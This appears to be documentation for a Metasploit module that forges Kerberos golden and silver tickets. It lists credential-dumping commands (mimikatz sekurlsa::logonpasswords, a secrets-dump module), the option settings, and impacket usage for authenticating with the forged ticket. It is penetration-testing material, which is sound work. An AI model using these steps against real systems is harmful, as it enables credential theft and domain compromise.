# Kerberos Ticket Forging (Golden/Silver tickets)

The `forge_kerberos_ticket` module allows the forging of a golden or silver ticket.

## Vulnerable Application

Any system leveraging kerberos as a means of authentication e.g. Active Directory, MSSQL

## Pre-Verification steps
1. Obtain your targets DOMAIN via your favorite method: e.g.
    `nmap <TARGET_IP>`
2. Next retrieve the DOMAIN_SID: e.g.
    `mimikatz # sekurlsa::logonpasswords`
    or
    `use auxiliary/gather/windows_secrets_dump`
3. Finally get the NTHASH of the service account you wish to target: e.g.
    `mimikatz # sekurlsa::logonpasswords` # same command as before, shows you both values
## Verification Steps

1. Start msfconsole
2. Do: `use auxiliary/admin/kerberos/forge_kerberos_ticket`
3. Do: `set DOMAIN DW.LOCAL`
4. Do: `set DOMAIN_SID S-1-5-21-1755879683-3641577184-3486455962`
5. Do: `set NTHASH 88E4D9FABAECF3DEC18DD80905521B29`
6. Do: `set USER fake_user`
7. Do: `set SPN MSSqlSvc/dc1.dw.local:1433` (Option only used for silver tickets)
8. Do: `forge_silver` to generate a silver ticket or `forge_golden` for a golden ticket
9. Use your ticket which will have been stored as loot with your chosen target
10. Example usage in impacket:
    ```
    export KRB5CCNAME=/path/to/ticket
    python3 mssqlclient.py DW.LOCAL/fake_mysql@dc1.dw.local -k -no-pass
    ```

## Actions

There are two kind of actions the module can run:

1. **Forge_Silver** - Create a Silver ticket. [Default]
2. **Forge_Golden** - Create a Golden ticket.
